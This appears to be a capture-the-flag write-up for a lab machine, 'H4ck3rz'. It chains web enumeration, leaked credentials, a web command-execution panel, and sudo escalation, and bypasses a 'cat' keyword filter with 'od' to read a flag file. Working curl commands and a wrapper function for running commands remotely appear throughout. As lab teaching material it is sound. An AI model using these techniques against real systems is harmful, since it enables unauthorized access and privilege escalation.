# Write-up : "H4ck3rz"

**Target:** 10.10.0.30

**Objective:** Get user.txt

**Difficulty:** Easy

**Date:** 16/09/2026

**Techniques used:** Network reconnaissance, OSINT/web enumeration, directory brute forcing, blacklist bypass, privilege escalation via sudo

**Tools used:** nmap, curl, gobuster, sshpass, xxd, nc

---

## 1. Network reconnaissance (Nmap)

**Command:**

```bash
nmap -sV -p- 10.10.0.30
```

**Why:** full scan of all TCP ports to identify exposed services before any exploitation attempt.

**Result:**

- `22/tcp` : SSH (OpenSSH 10.0p2 Debian)
- `80/tcp` : HTTP (Apache 2.4.68)

---

## 2. Exploring the main web page

**Command:**

```bash
curl -i http://10.10.0.30/
```

**Result:** a basic HTML page ("my 42sh") containing a comment hidden in the source code:

```html
<!--
STOP READING if you're not me!
Remember username: d4rk_T1t0u4N
-->
```

**Vulnerability exploited:** Exposure of sensitive information in the HTML source code (CWE-200: Exposure of Sensitive Information) -> a forgotten development comment reveals a username.

---

## 3. Discovering a hidden path via robots.txt

**Command:**

```bash
curl -s http://10.10.0.30/robots.txt
```

`-s` = Keeps the terminal output clean (you see the file's content directly without noise around it).

**Result:**

```
User-agent: *
Disallow: /1337_53CR37_l41r
```

**Vulnerability exploited:** robots.txt misused as a security mechanism (CWE-548: Exposure of Information Through Directory Listing) -> `robots.txt` is a convention that search engines use to tell indexing bots (Google, Bing, etc.) which parts of the site not to crawl/index, not an access control; here it reveals the existence of a path that would never have been guessed.

**Command:**

```bash
curl -i http://10.10.0.30/1337_53CR37_l41r/
```

`-i` = Used to display the response's HTTP headers in addition to the page body.

**Result:** a page revealing the associated password:

```html
<p>Just in case I forgot, password to my super future 42sh: 8ES7_SHeLL_Ev4H</p>
```

---

## 4. Unsuccessful SSH authentication attempt

```bash
ssh d4rk_T1t0u4N@10.10.0.30
# password: 8ES7_SHeLL_Ev4H → Permission denied
```

Several checks were carried out to rule out false leads:

```bash
sshpass -p '8ES7_SHeLL_Ev4H' ssh -v d4rk_T1t0u4N@10.10.0.30   # clean retry, without typing errors
curl -s http://10.10.0.30/1337_53CR37_l41r/ | grep -A1 -i password | xxd   # check for absence of invisible characters
nc -zv -w3 10.10.0.30 22   # check for absence of a fail2ban ban after several failures
```

**Conclusion:** the credentials found were not intended for SSH but for a web service that remained to be discovered.

---

## 5. Discovering the hidden web interface (directory brute-forcing)

**Command:**

```bash
gobuster dir -u http://10.10.0.30/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt,zip,bak -t 30
```

**Result:**

```
login.php     (Status: 200)
portal.php    (Status: 302) -> /login.php
forbidden.php (Status: 302) -> /login.php
```

**Vulnerability exploited:** Unreferenced but accessible pages ("security by obscurity") (CWE-425: Direct Access to a Resource) -> the `.php` files weren't linked from any page but remained publicly accessible.

---

## 6. Authentication on the web form

**Inspecting the form:**

```bash
curl -s http://10.10.0.30/login.php
```

-> fields `username`, `password`, button `sub`.

**Login:**

```bash
curl -s -c cookies.txt -X POST http://10.10.0.30/login.php \
  -d "username=d4rk_T1t0u4N&password=8ES7_SHeLL_Ev4H&sub=Login" \
  -i
```

**Result:** `HTTP/1.1 302 Found` with a redirect to `/portal.php` -> successful authentication, `PHPSESSID` session cookie obtained.

```bash
curl -s -c cookies.txt -b cookies.txt http://10.10.0.30/portal.php
```

**Result:** We come across a hidden HTML comment at the bottom of the page, base64 encoded.

<!-- YUdGMlpTQjViM1VnYUdWaGNtUWdiMllnWVNCeVlXSmlhWFFnYUc5c1pTQS9JRmx2ZFNCemFHOTFiR1FnYkc5dmF5QnBkQ0IxY0N3Z2VXOTFJR3AxYzNRZ1ptVnNiQ0JwYmlCdmJtVmNJUT09 -->

Once decoded = "have you heard of a rabbit hole? You should look it up, you just fell in one!" -> This is a hint.

---

## 7. Access to the "Shell" panel (legitimate remote command execution)

**Result:** a Shell Panel interface with a `command` field that executes system commands and displays the result in a `<pre>` tag.

**Vulnerability exploited:** Exposed arbitrary command execution (intentional but weakly filtered Remote Command Execution) (CWE-78: Improper Neutralization of Special Elements used in an OS Command), the feature itself is an entry point for system command execution.

**Optimization / defining a `run` function:**

Since all interactions with the Shell Panel reuse the same POST request to `portal.php` (only the command changes), we define a shell function that encapsulates the repetitive part. This replaces the long `curl` lines with a simple `run "<command>"`.

```bash
run() {
  curl -s -b cookies.txt -X POST http://10.10.0.30/portal.php \
    --data-urlencode "command=$1" \
    --data-urlencode "sub=Execute" ;
}
```

`"$1"` is the first argument passed to `run`, injected into the `command` field. The session cookie (`-b cookies.txt`) is kept for each call.

**Test:**

```bash
run "whoami"
```

-> result: `www-data`

---

## 8. System reconnaissance via the Shell Panel

```bash
run "ls -la /home"
```

**Key result:**

```
drwx------ 1 titouan titouan 4096 Aug 27 09:35 titouan
```

-> `titouan`'s home directory (700, inaccessible to `www-data`) probably contains `user.txt`.

---

## 9. Privilege escalation via sudo -l

```bash
run "sudo -l"
```

**Result:**

```
User www-data may run the following commands on h4xx0r_pc:
    (titouan) NOPASSWD: ALL
```

**Vulnerability exploited:** Excessively permissive sudo rule (CWE-269: Improper Privilege Management) - `www-data` can execute any command as `titouan`, without a password, which cancels out all the permission protection on the `/home/titouan` folder.

---

## 10. Bypassing the keyword filter

**First blocked attempt:**

```bash
run "sudo -u titouan cat /home/titouan/user.txt"
```

→ _"Command contain some forbidden keywords. Disabled to prevent dirty hackers, never too cautious"_ (the `cat` keyword is filtered server-side)

**Vulnerability exploited:** Bypassable command blacklist filtering (CWE-184: Incomplete List of Disallowed Inputs) - blocking `cat` without blocking the dozens of alternatives that allow reading a file is an illusory protection.

**Bypass with `od` (not filtered):**

```bash
run "sudo -u titouan od -c /home/titouan/user.txt"
```

**Result:**

```
0000000   E   P   I   {   7   1   m   e   _   7   0   _   D   0   _   7
0000020   H   0   5   E   _   N   c   u   R   5   e   2   }  \n
```

**FLAG obtained:**

```
EPI{71me_70_D0_7H05E_NcuR5e2}
```

---

## Summary of exploited vulnerabilities

| #   | Vulnerability                                                    | Category (CWE)                                 | Impact                                            |
| --- | ------------------------------------------------------------------ | ----------------------------------------------- | -------------------------------------------------- |
| 1   | HTML comment revealing a username                                 | CWE-200 (Exposure of Sensitive Information)     | Username leak                                      |
| 2   | robots.txt used as "security" to hide a path                       | CWE-548 (Directory listing / exposure)          | Discovery of a path containing the password        |
| 3   | PHP pages accessible without a link from the site                  | CWE-425 (Direct Access to a Resource)           | Discovery of login.php / portal.php                |
| 4   | Command execution panel exposed after authentication               | CWE-78 (OS Command Injection / intentional RCE) | Command execution as www-data                      |
| 5   | Sudo rule `(titouan) NOPASSWD: ALL` for www-data                    | CWE-269 (Improper Privilege Management)         | www-data → titouan escalation without a password   |
| 6   | Keyword blacklist filtering (cat blocked)                          | CWE-184 (Incomplete List of Disallowed Inputs)  | Trivial bypass with od, head, etc.                 |

---

## Exploitation chain (visual summary)

```
Hidden HTML comment
        │
        v
Username found (d4rk_T1t0u4N)
        │
        v
robots.txt -> hidden path /1337_53CR37_l41r/
        │
        v
Password found (8ES7_SHeLL_Ev4H)
        │
        v
Directory brute-force (gobuster) -> login.php / portal.php
        │
        v
Authentication on the web form (NOT SSH)
        │
        v
Access to the "Shell Panel" -> RCE as www-data
        │
        v
sudo -l -> (titouan) NOPASSWD: ALL
        │
        v
Bypassing the "cat" filter with "od -c"
        │
        v
Reading /home/titouan/user.txt → FLAG
```

---

## Conclusion

- **Initial access:** OSINT enumeration (HTML comment + robots.txt) → web credentials.
- **Application access:** authentication on `login.php` -> access to the Shell Panel -> RCE as `www-data`.
- **Privilege escalation:** sudo rule `NOPASSWD: ALL` to `titouan`, bypassing the keyword filter with `od`.
- **User flag:** `EPI{71me_70_D0_7H05E_NcuR5e2}` obtained in `/home/titouan/user.txt`.

---

## Evidences

### Brute force

![Brute force](Evidences/Brute%20force%20H4ck3rz.png)

### Flag

![Flag](Evidences/Flag%20H4ck3rz.png)
